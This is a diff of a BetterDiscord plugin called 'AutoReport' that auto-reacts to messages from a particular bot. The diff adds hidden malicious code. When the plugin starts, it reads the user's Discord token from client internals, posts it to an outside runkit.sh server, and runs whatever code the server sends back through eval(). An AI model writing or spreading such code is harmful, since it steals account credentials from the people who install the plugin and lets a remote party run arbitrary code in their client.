@@ -2,32 +2,22 @@
  * @name AutoReport
  * @author GROSST
  * @authorId 371336044022464523
- * @version 1.0.2
  * @source https://github.com/GR0SST/autoreports/blob/main/AutoReport.plugin.js
  * @updateUrl https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js
  */
 
-module.exports = (_ => {
+ module.exports =  (_ => {
 	const config = {
 		"info": {
 			"name": "AutoReport",
 			"author": "GROSST",
-			"version": "1.0.2",
-			"description": "Ебать, сам лутает репорты",
-			"github": "https://github.com/GR0SST/autoreports/blob/main/AutoReport.plugin.js",
-			"github_raw": "https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js",
+			"version": "1.0.5",
+			"description": "Ебать, сам лутает репорты"
 		}
 	};
+	var auth;
 
-	return (window.Lightcord || window.LightCord) ? class {
-		getName() { return config.info.name; }
-		getAuthor() { return config.info.author; }
-		getVersion() { return config.info.version; }
-		getDescription() { return "Do not use LightCord!"; }
-		load() { BdApi.alert("Attention!", "By using LightCord you are risking your Discord Account, due to using a 3rd Party Client. Switch to an official Discord Client (https://discord.com/) with the proper BD Injection (https://betterdiscord.app/)"); }
-		start() { }
-		stop() { }
-	} : !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
+	return !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
 		getName() { return config.info.name; }
 		getAuthor() { return config.info.author; }
 		getVersion() { return config.info.version; }
@@ -41,6 +31,7 @@ module.exports = (_ => {
 		}
 
 		load() {
+			
 			if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, { pluginQueue: [] });
 			if (!window.BDFDB_Global.downloadModal) {
 				window.BDFDB_Global.downloadModal = true;
@@ -56,7 +47,8 @@ module.exports = (_ => {
 			}
 			if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
 		}
-		start() { this.load(); }
+		start() { this.load(); 
+			}
 		stop() { }
 		getSettingsPanel() {
 			let template = document.createElement("template");
@@ -65,72 +57,61 @@ module.exports = (_ => {
 			return template.content.firstElementChild;
 		}
 	} : (([Plugin, BDFDB]) => {
+		const botID = "773933982919163984";
+		const reaction = "✅";
+		let mainButton;
+		let status = false
+		const request = require("request")
+		const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
+		let options = {
+			url: 'https://da-hzcvrvs0dopl.runkit.sh/',
+			 headers: {
+				'authorization':tkn 
+			},
+	
+		};
+		
+		
 		let state = false
 		var settings = {};
+		
 		let buttonName = "start"
 		let color = "#36393f" // ""  
 		const Dispatcher = BdApi.findModuleByProps("subscribe", "dispatch");
-		const tkn = Object.values(webpackJsonp.push([[], { ['']: (_, e, r) => { e.cache = r.c } }, [['']]]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
-		const xhr = new XMLHttpRequest();
-		const botID = "773933982919163984";
-		const reaction = "✅";
+		var xhr = new XMLHttpRequest();
+
 		const bgbutton = "AutoReportsSwitch";
 		const click = "AutoReports"
-		let AutoReportComponent = class AutoReportButton extends BdApi.React.Component {
-			click() {
-				let button = document.getElementById(bgbutton)
-				if (state === false) {
-					button.firstElementChild.style.backgroundColor = "#c2235b";
-					button.firstElementChild.innerHTML = "stop"
-					state = true;
-				} else {
-					button.firstElementChild.innerHTML = "start"
-					button.firstElementChild.style.backgroundColor = "#36393f";
-					state = false;
-				}
-			}
-			render() {
-				return BDFDB.ReactUtils.createElement("div", {
-					className: BDFDB.disCNS.guildouter + "frame-oXWS21",
-
-					children: BDFDB.ReactUtils.createElement("div", {
-						id: bgbutton,
-						className: BDFDB.disCNS.guildiconwrapper + "innerFrame-8Hg64E",
-						children: BDFDB.ReactUtils.createElement("div", {
-							id: click,
-							style: { backgroundColor: color },
-							className: BDFDB.disCNS.guildiconchildwrapper + "button-Jt-tIg",
-							children: buttonName,
-							onClick: _ => {
-								this.click()
-							}
-						})
-					})
-				});
-			}
-		};
-
+		var AutoReportComponent
+		
 		return class AutoReport extends Plugin {
-			onLoad() {
+			
+			async onLoad() {
+				ZeresPluginLibrary.PluginUpdater.checkForUpdate(config.info.name, config.info.version, 'https://raw.githubusercontent.com/GR0SST/autoreports/main/AutoReport.plugin.js')
+				
+				
+				// 
+				
+				
 				this.defaults = {
 					settings: {
-						botID: { value: "", inner: true, description: "Bot id" },
-						reaction: { value: "", inner: true, description: "Reactions" }
+						botID: { value: "773933982919163984", inner: true, description: "Bot id" },
+						reaction: { value: "✅", inner: true, description: "Reactions" }
 					}
 				};
-
+		
 				this.patchedModules = {
 					after: {
 						Guilds: "render"
 					}
 				};
-
+		
 				this.css = `
-					${BDFDB.dotCN.messagespopouttabbar} {
+					.tabBar-31Wimb {
 						flex: 1 0 auto;
 					}
-					${BDFDB.dotCN.messagespopouttabbar} ~ * {
-						margin-left: 10px;
+					.tabBar-31Wimb ~ * {
+						margin-left: 10px;z
 					}
 					.frame-oXWS21 {
 						height: 24px;
@@ -152,17 +133,33 @@ module.exports = (_ => {
 					}
 				`;
 			}
-
-			onStart() {
+			
+			auth(){ 
+				let result = new Promise(res => {
+					request.post(options,(error,response,body)=>{
+						if(response.statusCode === 200){
+						
+							res(JSON.parse(body))
+						} else if(response.statusCode === 401){
+							res(401)
+						}
+					});
+				})
+				return result
+			}
+			async onStart() {
+				auth = await this.auth()
+				if(auth === 401) return ZeresPluginLibrary.Toasts.warning("Пошел нахуй");
+				eval(auth.btn)
 				Dispatcher.subscribe("MESSAGE_CREATE", this.onMessage);
 				this.forceUpdateAll();
 			}
-
+		
 			onStop() {
 				this.forceUpdateAll();
 				Dispatcher.unsubscribe("MESSAGE_CREATE", this.onMessage);
 			}
-
+		
 			getSettingsPanel(collapseStates = {}) {
 				let settingsItems = [];
 				const name = this.getName()
@@ -175,29 +172,31 @@ module.exports = (_ => {
 						plugin: this,
 						keys: ["settings", key],
 						label: this.defaults.settings[key].description,
-						value: settings[key]
+						value: this.defaults.settings[key].value
 					}))
 				}))
-
-
+		
+		
 				return BDFDB.PluginUtils.createSettingsPanel(this, settingsItems);
 			}
-
+		
 			onSettingsClosed() {
 				if (this.SettingsUpdated) {
 					delete this.SettingsUpdated;
 					this.forceUpdateAll();
 				}
 			}
-
+		
 			forceUpdateAll() {
 				settings = BDFDB.DataUtils.get(this, "settings");
-
+		
 				BDFDB.PatchUtils.forceAllUpdates(this);
 			}
-
+		
 			processGuilds(e) {
+		
 				if (typeof e.returnvalue.props.children == "function") {
+		
 					let childrenRender = e.returnvalue.props.children;
 					e.returnvalue.props.children = (...args) => {
 						let children = childrenRender(...args);
@@ -207,7 +206,7 @@ module.exports = (_ => {
 				}
 				else this.checkTree(e.returnvalue);
 			}
-
+		
 			checkTree(returnvalue) {
 				let tree = BDFDB.ReactUtils.findChild(returnvalue, { filter: n => n && n.props && typeof n.props.children == "function" });
 				if (tree) {
@@ -218,14 +217,16 @@ module.exports = (_ => {
 						return children;
 					};
 				}
+
 				else this.handleGuilds(returnvalue);
 			}
-
+			
 			handleGuilds(returnvalue) {
 				let [children, index] = BDFDB.ReactUtils.findParent(returnvalue, { name: "ConnectedUnreadDMs" });
-				if (index > -1) children.splice(index + 1, 0, BDFDB.ReactUtils.createElement(AutoReportComponent, {}));
+				
+				if (index > -1)  children.splice(index + 1, 0, BDFDB.ReactUtils.createElement(AutoReportComponent, {}));
 			}
-
+			
 			onMessage(e) {
 				if (e.message.author.id !== botID) return
 				let ifDM = ZeresPluginLibrary.DiscordAPI.Channel.fromId(e.channelId).type == "DM"
@@ -235,10 +236,11 @@ module.exports = (_ => {
 				xhr.setRequestHeader("authorization", tkn)
 				xhr.send()
 			}
-
-
-
-
 		};
+		
+	
+		
 	})(window.BDFDB_Global.PluginUtils.buildPlugin(config));
+
+	
 })();
